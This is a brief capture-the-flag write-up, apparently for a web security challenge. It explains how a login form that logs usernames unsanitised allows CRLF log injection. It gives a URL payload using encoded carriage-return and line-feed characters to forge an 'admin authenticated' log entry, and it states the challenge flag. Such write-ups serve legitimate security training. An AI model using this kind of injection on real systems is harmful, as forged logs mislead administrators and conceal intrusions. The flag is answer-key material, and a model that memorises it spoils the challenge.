## Statement

> Inject false data in the journalisation log.

## Analyzation

We need to write to the log
```
admin authenticated
```

The login form did not prevent the space! When I try ```admin a```, it logs
```
admin a failed to authenticate
```

This is the vuln.

CRLF can be used to force logging a new line.

## Solution

```
/?username=admin%20authenticated.%0d%0aguest&password=a
```

The flag is
```
rFSP&G0p&5uAg1%
```
